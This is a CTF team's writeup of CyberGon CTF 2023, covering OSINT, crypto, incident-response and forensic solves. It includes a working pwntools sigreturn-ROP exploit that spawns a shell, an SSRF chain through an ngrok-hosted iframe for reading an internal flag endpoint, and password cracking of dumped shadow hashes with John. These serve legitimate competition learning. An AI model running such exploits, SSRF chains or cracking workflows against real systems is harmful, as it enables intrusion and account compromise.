---
title: Cybergon CTF 2023 Writeup
published: 2023-08-21
description: Writeups from CyberGon CTF 2023 (19–21 August 2023) — misc, OSINT, stegano, crypto, IR, forensics, pwn and web, by Team Pwn_|>.
tags: [ctf, osint, forensics, crypto, web, pwn, stegano, ir]
category: CTF
draft: false
---

- **Event:** CyberGon CTF 2023
- **Event dates:** 19–21 August 2023
- **Team:** Pwn_|>
- **Authors:** Zin Htet Aung, Kaung Yan Paing, Aung Soe Paing

## MISC

### Move Move

![Move Move](/images/cybergon-2023/cybergon-2023-p02-29.png)

For this challenge I searched "cl0p rat name" in Google. I found the RAT name
in a Fortinet blog post.

![Fortinet post](/images/cybergon-2023/cybergon-2023-p02-30.png)

Flag: `CybergonCTF{FlawedAmmyy}`

### Storm Zero Five Five Eight

![Storm-0558](/images/cybergon-2023/cybergon-2023-p03-33.png)

Microsoft announced it had mitigated an attack conducted by a China-linked
threat actor, tracked as **Storm-0558**, which targeted customer emails. The
attackers used an acquired MSA key to forge tokens to access OWA and
Outlook.com, exploiting a token validation issue to impersonate Azure AD users
and gain access to enterprise mail.

Flag: `CybergonCTF{MSA}`

### BMW for Sale

![BMW for Sale](/images/cybergon-2023/cybergon-2023-p03-34.png)

I got the Russian APT group BMW phishing campaign IOC through LinkedIn:

> [Russian State Hackers Uses BMW Car Ads to Deliver Malware](https://www.linkedin.com/pulse/russian-state-hackers-uses-bmw-car-ads-deliver-nimnaka-kumaradasa/)

![IOC article](/images/cybergon-2023/cybergon-2023-p03-13.png)

So I knew one of the malicious URLs was the flag.

Flag: `CybergonCTF{https://resetlocations.com/bmw.htm}`

### Operation Ghost

![Operation Ghost](/images/cybergon-2023/cybergon-2023-p04-38.png)

In this challenge, we searched about Operation Ghost on MITRE ATT&CK.

![MITRE](/images/cybergon-2023/cybergon-2023-p05-42.png)

Flag: `CybergonCTF{T1001.002}`

### Back Door

![Back Door](/images/cybergon-2023/cybergon-2023-p05-43.png)

I found the `.vbs` name in this post:
[https://attack.mitre.org/campaigns/C0007/](https://attack.mitre.org/campaigns/C0007/)

Flag: `CybergonCTF{wmiexec.vbs}`

### Find Me

![Find Me](/images/cybergon-2023/cybergon-2023-p06-46.png)

Just open the given Excel file, click on sheet 2, then search with the flag
format. You'll see the following photo — just expand the "V" column.

![Hidden photo](/images/cybergon-2023/cybergon-2023-p06-47.png)

Flag: `CybergonCTF{Hidden_Words_4_U}`

### Captured

![Captured](/images/cybergon-2023/cybergon-2023-p07-51.png)

First I downloaded the given file, then decoded it in a DTMF decoder
([dtmf.netlify.app](https://dtmf.netlify.app/)).

Flag: `CybergonCTF{09007007007}`

### Help Me

![Help Me](/images/cybergon-2023/cybergon-2023-p07-52.png)

We found the flashlight turning on and off in the challenge video and remembered
the Parasite (Korean movie) scene — he wants to tell us keywords through Morse
code using the flashlight.

![Flashlight](/images/cybergon-2023/cybergon-2023-p08-62.png)

Short flashlight time is `.` and long time is `_`:

```text
morse code - ... ___ ... ... ___ ... ... ___ ...
```

![Morse](/images/cybergon-2023/cybergon-2023-p08-63.png)

Flag: `CybergonCTF{SOS_SOS_SOS}`

### Wallet Address

![Wallet Address](/images/cybergon-2023/cybergon-2023-p08-64.png)

When I researched this challenge, I found a very useful article:
[Destructive malware targeting Ukrainian organizations](https://www.microsoft.com/en-us/security/blog/2022/01/15/destructive-malware-targeting-ukrainian-organizations/)

![Microsoft blog](/images/cybergon-2023/cybergon-2023-p09-67.png)

Flag: `CybergonCTF{1AVNM68gj6PGPFcJuftKATa4WLnzg8fpfv}`

## OSINT

### Warm Up 1

![Warm Up 1](/images/cybergon-2023/cybergon-2023-p09-68.png)

I searched the image in Google Images — it's a photo of the Shwe Yin Myaw
Pagoda, located in Hpa An, Kayin State.

Flag: `CybergonCTF{Kayin_State}`

### Big Fan 1

![Big Fan 1](/images/cybergon-2023/cybergon-2023-p10-71.png)

For this challenge I searched Exploit Ware Labs on Facebook. I found that
Mr. Yit gave a love react on the Exploit Ware Labs Facebook page.

![Facebook page](/images/cybergon-2023/cybergon-2023-p10-72.png)

![Love react](/images/cybergon-2023/cybergon-2023-p10-73.png)

Flag: `Cybergon{love_what_you_do}`

### Big Fan 2

![Big Fan 2](/images/cybergon-2023/cybergon-2023-p11-76.png)

I checked his profile image and knew he was a player of Manchester United.

Flag: `CybergonCTF{Manchester_United}`

### Big Fan 3

![Big Fan 3](/images/cybergon-2023/cybergon-2023-p11-77.png)

I found this image from Maung Yit's Facebook account, searched it in Google
Images, and found the photographer's name.

![Photographer](/images/cybergon-2023/cybergon-2023-p12-80.png)

Flag: `CybergonCTF{Win Tun Naing}`

### Channel

![Channel](/images/cybergon-2023/cybergon-2023-p12-81.png)

I searched `Maungyit1825` on Twitter and found the user James.

Flag: `CybergonCTF{Maungyit1825}`

### Where Is His Next Point ?

![Where Is His Next Point](/images/cybergon-2023/cybergon-2023-p13-84.png)

I found his Twitter account cover photo and searched it in Google Images. The
photo is Htukkant Thein Temple.

Flag: `CybergonCTF{Htukkantthein_Temple}`

### Arrival

![Arrival](/images/cybergon-2023/cybergon-2023-p13-85.png)

I knew the next point — the airport name must be a Rakhine airport.

Flag: `CybergonCTF{AKY}`

### Country

![Country](/images/cybergon-2023/cybergon-2023-p14-88.png)

I found his Facebook account where he uploaded this photo:

![Facebook photo](/images/cybergon-2023/cybergon-2023-p14-89.png)

I searched it in Google Images — it's one of the locations in Bangkok.

Flag: `CybergonCTF{Thailand}`

### Time To Rest

![Time To Rest](/images/cybergon-2023/cybergon-2023-p15-93.png)

Mr. Yit likes the Royal Place Hotel, according to his Facebook account.

Flag: `CybergonCTF{Royal_Place_Hotel}`

### Singer

![Singer](/images/cybergon-2023/cybergon-2023-p15-94.png)

I searched `Maungyit1825` on [whatsmyname.app](https://whatsmyname.app/):

![WhatsMyName](/images/cybergon-2023/cybergon-2023-p16-97.png)

![Result](/images/cybergon-2023/cybergon-2023-p16-98.png)

Flag: `CybergonCTF{raymond}`

### Let's Track Him

![Let's Track Him](/images/cybergon-2023/cybergon-2023-p16-99.png)

We downloaded the `Osint1.PNG` image file and searched the image location using
the Google image tool.

![Image search](/images/cybergon-2023/cybergon-2023-p17-102.png)

We found the place in the image on a website that shows public IP camera
information — source: [insecam.org/en/view/944573](https://www.insecam.org/en/view/944573/)

![Insecam](/images/cybergon-2023/cybergon-2023-p17-103.png)

We could find the source IP camera address from the image link.

![Camera address](/images/cybergon-2023/cybergon-2023-p17-104.png)

Flag: `CybergonCTF{188.11.27.179}`

## Stegano

### Your_Craziest_Song

![Your_Craziest_Song](/images/cybergon-2023/cybergon-2023-p18-108.png)

For this challenge we're given a `Morse_Code.wav` file. First I did basic
analysis and ran `strings` on the file:

![strings](/images/cybergon-2023/cybergon-2023-p18-109.png)

If we read the description again, we can see "**deeply**" — referring to the
DeepSound tool.

![DeepSound](/images/cybergon-2023/cybergon-2023-p19-112.png)

Enter the password we got above and it extracts `Flag.txt`. Opening the text
file gives Morse code. Don't forget to remove `{` and `}` while decoding, then
wrap the result with the flag format.

Flag: `CyberGonCTF{M4UNG_7H4_B4W_P4L_P07_M4UNG_Y4L_M4UNG_Y4L}`

### Warm Up 1

![Stegano Warm Up 1](/images/cybergon-2023/cybergon-2023-p19-113.png)

For this challenge I checked the image file with `exiftool`.

Flag: `CybergonCTF{2023:07:31-10:14:57}`

## Crypto

### Warm Up 1

![Crypto Warm Up 1](/images/cybergon-2023/cybergon-2023-p20-117.png)

We are given a photo in which the Gravity Falls Author Cipher is written:

![Gravity Falls cipher](/images/cybergon-2023/cybergon-2023-p20-118.png)

![Decoded](/images/cybergon-2023/cybergon-2023-p20-119.png)

Flag: `CybergonCTF{John Wick}`

### Warm Up 2

![Crypto Warm Up 2](/images/cybergon-2023/cybergon-2023-p21-122.png)

I felt it was a columnar transposition cipher, so I wrote it down in my notebook:

![Columnar transposition](/images/cybergon-2023/cybergon-2023-p21-123.png)

Flag: `CybergonCTF{ROME}`

### Game

![Game](/images/cybergon-2023/cybergon-2023-p22-126.png)

I felt it was a letter un-shuffler cipher. Decrypted here:
[dcode.fr/shuffled-letters](https://www.dcode.fr/shuffled-letters)

![dcode](/images/cybergon-2023/cybergon-2023-p22-127.png)

Flag: `CybergonCTF{donotplaybloodymarrywhenyouarealone}`

### Now You See Me 1

![Now You See Me 1](/images/cybergon-2023/cybergon-2023-p22-128.png)

When I opened the given text file there was nothing — but if we drag the left
click, we can see it like this:

![Whitespace](/images/cybergon-2023/cybergon-2023-p23-131.png)

It's the Whitespace language, so I decoded it in an online tool.

![Whitespace decode](/images/cybergon-2023/cybergon-2023-p23-132.png)

Flag: `CybergonCTF{Always_Look_Beyond_What_You_Can_See}`

### Now You See Me 2

![Now You See Me 2](/images/cybergon-2023/cybergon-2023-p23-133.png)

When we opened it, we got a lot of spam messages. I'd seen this before in other
CTFs — it hides short messages in fake spam. We decoded it here:
[spammimic.com/decode.shtml](https://www.spammimic.com/decode.shtml)

![spammimic](/images/cybergon-2023/cybergon-2023-p24-137.png)

Flag: `CybergonCTF{Gold_In_The_Trash}`

### Dots

![Dots](/images/cybergon-2023/cybergon-2023-p24-138.png)

When we opened the given image file, there were many dots in the photo — like a
Braille cipher. So we decoded it using the online Braille decoder from
[dcode.fr/braille-alphabet](https://www.dcode.fr/braille-alphabet):

![Braille](/images/cybergon-2023/cybergon-2023-p24-139.png)

![Decrypted](/images/cybergon-2023/cybergon-2023-p25-142.png)

Decrypted result: `THEEYESAREUSELESSWHENTHEMINDISBLIND`. The flag format is
lowercase.

Flag: `CybergonCTF{theeyesareuselesswhenthemindisblind}`

### dO NOT aCCESS

![dO NOT aCCESS](/images/cybergon-2023/cybergon-2023-p25-143.png)

When we opened the given image file, there were many colors — the Hexahue
cipher:

![Hexahue](/images/cybergon-2023/cybergon-2023-p26-147.png)

After decoding it, we got a DNA cipher code:

```text
ACT TCG TAG TTG CGA TTC CCA TTG GAA TTC TGG TTG CTC GCT TCT TTG AAG TTC CTC TCG
```

We decoded it using a DNA code table and wrapped the decoded string with the
flag format.

Flag: `CybergonCTF{h3Y_y0u_G07_DN4_c0D3}`

### EZ RSA

![EZ RSA](/images/cybergon-2023/cybergon-2023-p26-148.png)

The challenge gave `crypto3.py` and `output.txt`:

```python
from Crypto.Util.number import getStrongPrime, bytes_to_long
import re
from random import randint

flag = open("flag.txt").read()
m = bytes_to_long(flag.encode())
p = getStrongPrime(512)
q = getStrongPrime(512)
n = p*q
e = 0x10001
c = pow(m,e,n)

num = randint(100,999)

p_encode = []
q_encode = []

p_list = re.findall('.', str(p))
q_list = re.findall('.', str(q))

for value in range(len(p_list)):
    p_encode.append(str(int(p_list[value]) ^ num))
    q_encode.append(str(int(q_list[value]) ^ num))

print(c)
print(n)
print(p_encode)
print(q_encode)
```

The given code generates a random integer `num` between 100 and 999, converts
`p` and `q` to strings, extracts each digit with `re.findall('.', ...)`, and
XOR-encodes each digit with `num`. The results are stored in the lists
`p_encode` and `q_encode` (printed to `output.txt`).

Solution — brute-force `num` from 100 to 999, decode `p` and `q`, and check
which pair multiplies to `n`:

```python
from Crypto.Util.number import long_to_bytes

c = 7888201563339715729523532042336435671029501468546161810089984232235554861652583632887518799780638295517969338796557433802757791039299392111133348792678647433923838996453867899867154174775001564873158918992088753165448384991560929913405612800913117217515602253774065754803427581757277751978337814275689105334
n = 130127292446949390212867735855086334421393298489352915445932034098974310494854685420188208182244644737973417566696954612517320009326051854904532961110247688311376993922989760554696056080388241259670599567937477306283613224095383043997900439331609449744523632839529123448169800791720798913702566069153373216373
p_encode = ['514', '515', '522', '523', '519', '514', '515', '513', '513', '513', '514', '522', '518', '518', '522', '514', '514', '516', '523', '523', '519', '514', '522', '522', '516', '519', '513', '522', '512', '512', '518', '517', '512', '513', '518', '512', '518', '513', '512', '516', '515', '513', '513', '516', '518', '514', '517', '522', '516', '519', '523', '514', '515', '523', '513', '515', '512', '514', '513', '519', '517', '518', '513', '517', '513', '523', '514', '518', '522', '519', '518', '522', '518', '522', '518', '513', '522', '516', '514', '513', '516', '514', '516', '514', '513', '519', '514', '514', '514', '523', '519', '523', '512', '515', '518', '522', '515', '516', '523', '522', '512', '512', '522', '518', '517', '516', '515', '514', '515', '514', '523', '514', '512', '518', '519', '522', '516', '516', '522', '516', '514', '517', '514', '517', '523', '523', '513', '518', '512', '515', '518', '518', '514', '519', '512', '522', '517', '518', '516', '518', '515', '517', '523', '519', '515', '519', '519', '519', '518', '519', '512', '516', '514', '522', '516']
q_encode = ['514', '514', '523', '519', '517', '523', '516', '518', '518', '523', '518', '522', '518', '516', '512', '518', '514', '517', '515', '518', '516', '516', '523', '513', '515', '517', '512', '517', '517', '523', '514', '523', '517', '523', '517', '517', '513', '519', '519', '515', '512', '519', '517', '515', '522', '512', '519', '517', '516', '516', '517', '516', '513', '517', '517', '514', '516', '522', '522', '516', '517', '512', '515', '512', '523', '518', '516', '514', '517', '513', '523', '517', '518', '522', '517', '523', '518', '522', '512', '518', '522', '522', '523', '514', '518', '523', '518', '517', '515', '516', '512', '512', '516', '518', '516', '513', '522', '523', '518', '512', '515', '522', '512', '516', '518', '516', '515', '517', '522', '516', '522', '514', '514', '514', '523', '518', '512', '518', '515', '515', '522', '523', '522', '522', '522', '518', '516', '523', '523', '523', '513', '514', '517', '512', '513', '514', '519', '518', '516', '519', '518', '523', '518', '514', '518', '514', '514', '519', '522', '513', '522', '513', '523', '515', '522']

for num in range(100, 1000):
    p_decoded = int(''.join([str(int(digit) ^ num) for digit in p_encode]))
    q_decoded = int(''.join([str(int(digit) ^ num) for digit in q_encode]))
    n_calculated = p_decoded * q_decoded
    if n_calculated == n:
        d = pow(0x10001, -1, (p_decoded - 1) * (q_decoded - 1))
        m = pow(c, d, n)
        flag = long_to_bytes(m)
        print("Decoded num:", num)
        print("Flag :", flag)
        break
```

![Running the solver](/images/cybergon-2023/cybergon-2023-p29-156.png)

Flag: `CyberGonCTF{345y_p34sy_R54_c1ph3R}`

## IR

This was a very interesting category — we had to download a 24 GB file one day
before the CTF.

![24GB file](/images/cybergon-2023/cybergon-2023-p29-157.png)

### Registry — Timezone & Hostname

For the first challenge, I dumped some registry files such as `SOFTWARE`,
`SECURITY`, and installed
[RegRipper3.0](https://github.com/keydet89/RegRipper3.0). Then I loaded the
`SYSTEM` file into the tool.

![RegRipper](/images/cybergon-2023/cybergon-2023-p30-160.png)

In the extracted file we can find the timezone and hostname:

![Timezone](/images/cybergon-2023/cybergon-2023-p30-161.png)

![Hostname](/images/cybergon-2023/cybergon-2023-p30-162.png)

Flag: `CyberGonCTF{SE Asia Standard Time, CyberGon-CTF}`

### Application Name

![Application Name](/images/cybergon-2023/cybergon-2023-p31-165.png)

In the interesting files, we can see `keepass.exe` listed as "Encryption
Program".

![keepass.exe](/images/cybergon-2023/cybergon-2023-p31-166.png)

Flag: `CyberGonCTF{keepass}`

### Bank Name

![Bank Name](/images/cybergon-2023/cybergon-2023-p32-169.png)

From the challenge above we knew the employee uses KeePass to store her
information. Moreover, I found `AllinOne.kdbx` and a useful base64 string —
after decoding it gave `EmilythingsAllBest2023$$$`. Both were under
`Users/ACCOUNT01/Documents/Mine`. So I decided to dump `AllinOne.kdbx` and
installed `keepass.exe` on my machine.

![Dumping the kdbx](/images/cybergon-2023/cybergon-2023-p32-170.png)

Opening `AllinOne.kdbx` with the password `EmilythingsAllBest2023$$$`:

![KeePass opened](/images/cybergon-2023/cybergon-2023-p32-171.png)

Flag: `CybergonCTF{Obank}`

### Application Name (Remote Tool)

![Application Name](/images/cybergon-2023/cybergon-2023-p33-174.png)

In Installed Programs, we can list the installed applications:

![Installed programs](/images/cybergon-2023/cybergon-2023-p33-175.png)

Flag: `CybergonCTF{anydesk}`

### Victim Info

![Victim Info](/images/cybergon-2023/cybergon-2023-p34-178.png)

For this challenge I checked all her email messages, and one of them said they
met up at BusinessConf2023.

![Email](/images/cybergon-2023/cybergon-2023-p34-179.png)

Flag: `CybergonCTF{BusinessConf2023}`

### TA001_A

![TA001_A](/images/cybergon-2023/cybergon-2023-p35-184.png)

In another email message, the attacker told her to scan the QR code:

![QR code email](/images/cybergon-2023/cybergon-2023-p35-185.png)

That QR code leads to `apple1d.com`, which resolves to `202.79.161.2`.

Flag: `CybergonCTF{202.79.161.2}`

### TA0001_B

![TA0001_B](/images/cybergon-2023/cybergon-2023-p36-189.png)

I checked the IP from the challenge above in VirusTotal. There was another
domain `ios.removeios.com` with that IP, and we can see its creation date.

![VirusTotal](/images/cybergon-2023/cybergon-2023-p36-190.png)

![Creation date](/images/cybergon-2023/cybergon-2023-p37-193.png)

Flag: `CybergonCTF{ios.removeios.com, 2023-07-17}`

### Data Exfiltration

![Data Exfiltration](/images/cybergon-2023/cybergon-2023-p38-197.png)

For this challenge I decided to extract "Web History" as CSV:

![Web history](/images/cybergon-2023/cybergon-2023-p38-198.png)

The challenge description said the attacker pretended to be an employee so the
traffic wouldn't be suspicious. So I searched cloud file sharing services and
finally found `https://sendspace.com/` — the attacker had also registered there.

![sendspace](/images/cybergon-2023/cybergon-2023-p39-201.png)

Flag: `CybergonCTF{sendspace}`

### Car Brand

![Car Brand](/images/cybergon-2023/cybergon-2023-p39-202.png)

In the extracted web history from the challenge above, we can clearly see the
employee is looking at the BMW car brand:

![BMW searches](/images/cybergon-2023/cybergon-2023-p40-206.png)

Flag: `CybergonCTF{bmw}`

### Car Brand 1

![Car Brand 1](/images/cybergon-2023/cybergon-2023-p40-207.png)

We saw that the employee was searching for cars on `https://carsome.co.th`.

Flag: `CybergonCTF{Thailand}`

### Car Brand 2

![Car Brand 2](/images/cybergon-2023/cybergon-2023-p41-210.png)

I extracted all email files and opened them in Sublime Text:

![Emails](/images/cybergon-2023/cybergon-2023-p41-211.png)

I removed some messages until we found a marketing email:

![Marketing email](/images/cybergon-2023/cybergon-2023-p42-215.png)

I uploaded this file to [app.phishtool.com](https://app.phishtool.com), a great
tool for analyzing phishing emails:

![PhishTool](/images/cybergon-2023/cybergon-2023-p42-216.png)

Then I checked the IP address on [ipinfo.io](https://ipinfo.io/):

![ipinfo](/images/cybergon-2023/cybergon-2023-p43-219.png)

![ipinfo result](/images/cybergon-2023/cybergon-2023-p43-220.png)

Flag: `CybergonCTF{89.187.129.29_Czechia_emkei.cz}`

### Car Brand 3

![Car Brand 3](/images/cybergon-2023/cybergon-2023-p44-226.png)

In the email message, we can see `ops.rejon4@kazmierz.pl` as the contact
address:

![Contact address](/images/cybergon-2023/cybergon-2023-p44-227.png)

In the web history list, the employee visited `http://tinyurl.com/ysvxa66c`.
According to the information we have, it relates to **APT29**.

Flag: `CybergonCTF{APT29}`

### Car Brand 4

![Car Brand 4](/images/cybergon-2023/cybergon-2023-p45-230.png)

We already found the answer in the challenge above.

Flag: `CybergonCTF{http://tinyurl.com/ysvxa66c,ops.rejon4@kazmierz.pl}`

## Forensics

### Device Info (ep1)

![Device Info ep1](/images/cybergon-2023/cybergon-2023-p46-233.png)

I used Autopsy for this challenge series. For this first challenge, we can see
the operating system information in `lsb-release`, under the Data Artifacts
category:

![lsb-release](/images/cybergon-2023/cybergon-2023-p46-234.png)

Flag: `CyberGonCTF{Ubuntu 20.04.5 LTS}`

### Device Info (ep2)

![Device Info ep2](/images/cybergon-2023/cybergon-2023-p47-237.png)

We can see the device IP in `/var/log/syslog`:

![syslog](/images/cybergon-2023/cybergon-2023-p47-238.png)

Flag: `CyberGonCTF{192.168.1.72_ubuntu}`

### Device Info (ep3)

![Device Info ep3](/images/cybergon-2023/cybergon-2023-p48-241.png)

In `/etc/netplan/50-cloud-init.yaml` there is the WiFi information:

![netplan](/images/cybergon-2023/cybergon-2023-p48-242.png)

Flag: `CyberGonCTF{Ko_Koe_Lo_Ko_Ko_Ah_Nge_Chaw_Yal_Tae_Inn_Tae}`

### Device Info (ep4)

![Device Info ep4](/images/cybergon-2023/cybergon-2023-p49-245.png)

I found the machine model in the `/etc/netplan/.50-cloud-init.yaml.swp` file:

![Machine model](/images/cybergon-2023/cybergon-2023-p49-246.png)

Flag: `CyberGonCTF{Raspberry Pi 3 Model B Rev 1.2}`

### Attacker IP (ep5)

![Attacker IP ep5](/images/cybergon-2023/cybergon-2023-p50-249.png)

In `/var/log/auth.log`, we can see SSH brute forcing from `192.168.1.67`:

![auth.log](/images/cybergon-2023/cybergon-2023-p50-250.png)

Flag: `CyberGonCTF{192.168.1.67}`

### Success Logon (ep6)

![Success Logon ep6](/images/cybergon-2023/cybergon-2023-p51-253.png)

Counting the failed login attempts, there are 652 in total. The accepted
password can be filtered for the second part of the question:

![Failed count](/images/cybergon-2023/cybergon-2023-p51-254.png)

![Accepted](/images/cybergon-2023/cybergon-2023-p51-255.png)

Flag: `CyberGonCTF{652_Jul 15 16:55:26}`

### New User (ep7)

![New User ep7](/images/cybergon-2023/cybergon-2023-p52-258.png)

As soon as the attacker logged in to the host, he added a new user
`shwehmoneyati`. So we decided to dump the `passwd` and `shadow` files using
Autopsy:

![passwd/shadow](/images/cybergon-2023/cybergon-2023-p52-259.png)

Then I generated the password list with a Python script:

![Password list generation](/images/cybergon-2023/cybergon-2023-p52-260.png)

Then I brute-forced the `shwehmoneyati` user with John:

![john](/images/cybergon-2023/cybergon-2023-p53-263.png)

Flag: `CybergonCTF{shwehmoneyati, ShweHtoo1500}`

### Stolen Data (ep8)

![Stolen Data ep8](/images/cybergon-2023/cybergon-2023-p53-264.png)

We can find the commands the attacker used in `/root/.bash_history`:

![bash history](/images/cybergon-2023/cybergon-2023-p54-267.png)

Flag: `CyberGonCTF{kali_192.168.253.144}`

### Mitre (ep9)

![Mitre ep9](/images/cybergon-2023/cybergon-2023-p54-268.png)

First the attacker brute-forced the password to enter the host (T1110.001).
Then he created an account to maintain access to the victim systems (T1136).
Finally, he exfiltrated data over protocol using the `scp` command (T1048).

Flag: `CyberGonCTF{T1110.001_T1136_T1048}`

### Bonus (ep10)

![Bonus ep10](/images/cybergon-2023/cybergon-2023-p55-271.png)

For this challenge I generated the password list with a Python script:

![Password generation](/images/cybergon-2023/cybergon-2023-p55-272.png)

Then I brute-forced the Hlwan Paing user's password with John:

![john](/images/cybergon-2023/cybergon-2023-p55-273.png)

Flag: `CybergonCTF{BobbySoxer@1500}`

### Hide And Seek

![Hide And Seek](/images/cybergon-2023/cybergon-2023-p56-276.png)

![Files](/images/cybergon-2023/cybergon-2023-p56-277.png)

Extracting the file and checking each file, I found Brainfuck code in the
`word/header1.xml` file:

![header1.xml](/images/cybergon-2023/cybergon-2023-p57-281.png)

Replace all `&gt;` with `>` and `&lt;` with `<`:

![Escapes replaced](/images/cybergon-2023/cybergon-2023-p57-282.png)

Then I decoded it on [dcode.fr/brainfuck-language](https://www.dcode.fr/brainfuck-language):

![Brainfuck decode](/images/cybergon-2023/cybergon-2023-p57-283.png)

Flag: `CyberGonCTF{53cR37_D474_1n_H34d3R}`

### 8cel

![8cel](/images/cybergon-2023/cybergon-2023-p58-286.png)

First I changed the file extension of the given file from `8cel.zip` to
`8cel.xlsx` and opened it in Excel. When I used `exiftool` on that file, we
could see there's another hidden sheet (Sheet3):

![Hidden sheet](/images/cybergon-2023/cybergon-2023-p58-287.png)

Click on the sheet tab and unhide Sheet 3. In Sheet 3, I deleted all photos and
there was a rectangle spanning Cell A and Cell B:

![Sheet3](/images/cybergon-2023/cybergon-2023-p59-290.png)

![Rectangle](/images/cybergon-2023/cybergon-2023-p59-291.png)

Select the rectangle and change the font color to something like red or blue:

![Font color](/images/cybergon-2023/cybergon-2023-p60-294.png)

After decoding those base64 strings we get `WeLov3cYb3Rg0nCTF`. When I checked
Sheet 1 again, it looked like a protected sheet — so I used
`WeLov3cYb3Rg0nCTF` to unprotect it:

![Unprotected](/images/cybergon-2023/cybergon-2023-p61-297.png)

Then I removed all photos again from Sheet 1 and could see formulas in the
cells. To check all formulas, go to the "Formulas" tab and click "Show
Formulas":

![Show formulas](/images/cybergon-2023/cybergon-2023-p61-298.png)

In cell E14 there is one formula which is unique from the others:

![E14 formula](/images/cybergon-2023/cybergon-2023-p62-301.png)

Just copy and decode it in CyberChef:

Flag: `CyberGonCTF{y0u_G07_7h3_53cR37_1Nf0}`

## Pwn

### teeny

![teeny](/images/cybergon-2023/cybergon-2023-p62-302.png)

We downloaded the `teeny` binary file and checked it with checksec:

![checksec](/images/cybergon-2023/cybergon-2023-p63-305.png)

After checking the security of the binary, we found NX disabled — meaning we
can put our shellcode on the stack. It executes amd64 architecture with little
endian byte ordering, no canary (frame size strict), and no PIE (binary
addresses are stable) — so much fun.

Then we opened the binary with Ghidra and found the `syscall()` function. Our
input will be stored as data, and any attempt to run it as instructions will
crash the program, effectively neutralizing shellcode. PIE means
position-independent executable — in this challenge it is No-PIE, so we can use
shellcode and normal ROP over the binary.

![Ghidra](/images/cybergon-2023/cybergon-2023-p63-306.png)

![Gadgets](/images/cybergon-2023/cybergon-2023-p63-307.png)

We found the `syscall()` return address — `0x40015`, `pop rax` address —
`0x40018`, then created the payload and sent it to the target server:

```python
from pwn import *

# conn = remote("cybergon2023.webhop.me", 5004)
conn = process("./teeny")

poprr = 0x40018
binsh = 0x40238
syscall = 0x40015

frame = SigreturnFrame(arch="amd64", kernel="amd64")
frame.rax = 0x3b
frame.rdi = binsh
frame.rsi = 0
frame.rdx = 0
frame.rip = syscall

payload = b"A" * 8
payload += p64(poprr)
payload += p64(0xf)
payload += p64(syscall)
payload += bytes(frame)

conn.sendline(payload)
conn.interactive()
```

![Exploit running](/images/cybergon-2023/cybergon-2023-p64-310.png)

Flag: `CybergonCTF{5UD0_R0P_ch41n}`

## Web

### Love is Blurry

![Love is Blurry](/images/cybergon-2023/cybergon-2023-p65-313.png)

In this challenge, we found some hint letters on the target challenge web page.
So we needed to change the request GET method to POST:

![POST request](/images/cybergon-2023/cybergon-2023-p65-314.png)

![POST response](/images/cybergon-2023/cybergon-2023-p66-317.png)

![Hint](/images/cybergon-2023/cybergon-2023-p66-318.png)

It could be an SSRF vulnerability — we requested google.com from the `url=`
parameter and got a blurred response from Google:

![SSRF confirmed](/images/cybergon-2023/cybergon-2023-p66-319.png)

Yep — sure SSRF. We also needed to check the target website's internal server
on port 8000 with the flag parameter. It also blurred the response data from
`127.0.0.1:8000/flag`:

![Blurred flag](/images/cybergon-2023/cybergon-2023-p67-322.png)

Our SSRF request procedure:

```text
Attacker >> Target Web >> url=localhost:8000/flag
```

![Procedure](/images/cybergon-2023/cybergon-2023-p67-323.png)

Hint — there is a joke about "Hack NASA with HTML", but this one isn't a joke :3

So we prepared an HTML requester via an ngrok proxy host. We created a Python
web server and bound the port with the ngrok public proxy host:

```text
Attacker >> Target Web >> url=SSRF html requester via iframe (ngrok) >> localhost:8000/flag
```

![Requester part 1](/images/cybergon-2023/cybergon-2023-p68-326.png)

![Requester part 2](/images/cybergon-2023/cybergon-2023-p68-328.png)

![Requester part 3](/images/cybergon-2023/cybergon-2023-p68-329.png)

Yep!! We can see the flag page response data through our SSRF requester. At
this point we added CSS code to our SSRF requester because we wanted to adjust
the blurred response data using CSS properties:

![CSS requester](/images/cybergon-2023/cybergon-2023-p69-332.png)

Let's request!

![Request](/images/cybergon-2023/cybergon-2023-p69-333.png)

Then we found the CyberGon flag format with empty spaces — and we remembered
the whitespace flag values in the hint HTML file:

![Whitespace flag](/images/cybergon-2023/cybergon-2023-p69-334.png)

We changed the background color from white to black because we wanted to
identify the whitespace characters. Request again... boom!! We can see the
whitespace data. To continuously identify the whitespace data, the
`transform-origin` values need to be gradually increased every time a request is
sent:

![Black background](/images/cybergon-2023/cybergon-2023-p70-337.png)

![Whitespace identified](/images/cybergon-2023/cybergon-2023-p70-338.png)

![transform-origin](/images/cybergon-2023/cybergon-2023-p70-339.png)

![All results](/images/cybergon-2023/cybergon-2023-p71-348.png)

All whitespace results: `5|5|r|F|_|1|5|_|C|0|0|1|1|3|3|7|_|2|2|c|6|e|8|b|e|f|2|b|8|c|d|e|5`

Flag: `CyberGon{5|5|r|F|_|1|5|_|C|0|0|1|1|3|3|7|_|2|2|c|6|e|8|b|e|f|2|b|8|c|d|e|5}`

---

Thanks for the challenges, CyberGon!

![Thanks](/images/cybergon-2023/cybergon-2023-p71-342.png)

**Team Pwn_|>**

![Team](/images/cybergon-2023/cybergon-2023-p71-346.png)
